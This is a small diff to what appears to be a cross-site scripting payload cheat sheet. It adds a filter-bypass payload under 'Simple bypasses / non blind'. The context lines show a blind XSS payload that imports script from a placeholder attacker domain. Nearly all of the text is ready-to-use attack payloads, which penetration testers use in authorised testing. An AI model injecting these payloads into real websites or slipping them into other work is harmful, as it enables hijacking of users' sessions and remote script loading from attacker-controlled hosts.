@@ -52,3 +52,9 @@ Blind XSS:
 ```html
 <svg/onload=import('//$ATT_DOMAIN')>
 ```
+
+Simple bypasses / non blind:
+
+```html
+1"Onxx=><Svg/Onload=alert(1)//
+```
